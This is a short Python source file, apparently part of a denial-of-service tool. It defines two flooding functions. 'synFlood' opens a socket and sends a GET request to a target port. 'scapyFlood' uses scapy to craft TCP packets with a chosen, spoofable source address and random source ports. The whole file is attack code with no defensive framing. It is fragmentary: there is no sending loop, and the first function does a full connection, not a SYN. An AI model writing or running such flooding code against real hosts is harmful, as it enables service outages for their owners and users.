from scapy.all import *
from time import sleep
import socket
def synFlood(src,tgt,port):
    port=port
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((tgt,port))
    sock.send('GET /?{0} HTTP/1.1\r\n'.format(port).encode('UTF-8'))
    sock.close()
def scapyFlood(src,tgt,port):
    IPlayer=IP(src=src,dst=tgt)
    TCPlayer=TCP(sport=random.randint(0,65535),dport=port)
    pkt=IPlayer/TCPlayer
    send(pkt)

